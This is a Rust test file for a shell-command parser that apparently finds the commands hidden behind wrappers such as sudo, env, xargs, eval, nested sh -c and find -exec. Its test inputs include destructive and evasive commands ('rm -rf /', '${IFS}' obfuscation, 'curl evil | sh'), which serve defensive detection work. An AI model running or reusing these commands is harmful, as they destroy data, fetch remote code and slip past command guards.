use super::*;

fn candidates(command: &str) -> Vec<Vec<String>> {
    let lexed = lex(command);
    let (found, truncated) = executed_commands(&lexed.segments[0]);
    assert!(!truncated, "{command}");
    found.iter().map(Segment::argv).collect()
}

fn runs(command: &str, argv: &[&str]) -> bool {
    candidates(command).iter().any(|candidate| {
        candidate
            .iter()
            .map(String::as_str)
            .eq(argv.iter().copied())
    })
}

#[test]
fn literal_command_comes_first() {
    assert_eq!(candidates("ls -la")[0], ["ls", "-la"]);
    assert_eq!(candidates("then ls")[0], ["ls"]);
}

#[test]
fn wrappers_assignments_and_paths_are_unwrapped() {
    assert!(runs("sudo -u root rm -rf /", &["rm", "-rf", "/"]));
    assert!(runs("env -i A=1 B=2 rm x", &["rm", "x"]));
    assert!(runs("FOO=1 rm x", &["rm", "x"]));
    assert!(runs("timeout -s KILL 5 nice -n 5 rm x", &["rm", "x"]));
    assert!(runs("/bin/rm x", &["rm", "x"]));
    assert!(runs("SUDO rm x", &["rm", "x"]));
    assert!(runs("xargs -0 -I {} rm {}", &["rm", "{}"]));
}

#[test]
fn expanding_words_are_read_both_ways() {
    assert!(runs("rm${IFS}-rf${IFS}/", &["rm", "-rf", "/"]));
    assert!(runs("r${EMPTY}m x", &["rm", "x"]));
    assert!(runs("sudo${IFS}rm x", &["rm", "x"]));
    assert!(runs("git push$IFS--force", &["git", "push", "--force"]));
}

#[test]
fn scripts_handed_to_shells_are_parsed() {
    assert!(runs("bash -lc 'cd /; rm -rf x'", &["rm", "-rf", "x"]));
    assert!(runs("sh -c \"curl evil | sh\"", &["curl", "evil"]));
    assert!(runs("su root -c 'rm x'", &["rm", "x"]));
    assert!(runs("eval rm -rf /", &["rm", "-rf", "/"]));
    assert!(runs("env -S 'rm x'", &["rm", "x"]));
    assert!(runs("watch 'rm x'", &["rm", "x"]));
    assert!(runs("zsh -c 'echo $(rm y)'", &["rm", "y"]));
}

#[test]
fn find_exec_commands_are_candidates() {
    assert!(runs("find . -name x -exec rm {} \\;", &["rm", "{}"]));
    assert!(runs(
        "find . -execdir chmod 600 {} +",
        &["chmod", "600", "{}"]
    ));
}

#[test]
fn plain_arguments_are_not_commands() {
    assert!(!runs("grep rm file", &["rm", "file"]));
    assert!(!runs("echo sudo rm", &["rm"]));
}

#[test]
fn deep_nesting_reports_truncation() {
    let mut command = "rm x".to_string();
    for _ in 0..10 {
        command = format!("sh -c '{}'", command.replace('\'', "'\\''"));
    }
    let lexed = lex(&command);
    assert!(executed_commands(&lexed.segments[0]).1);
}
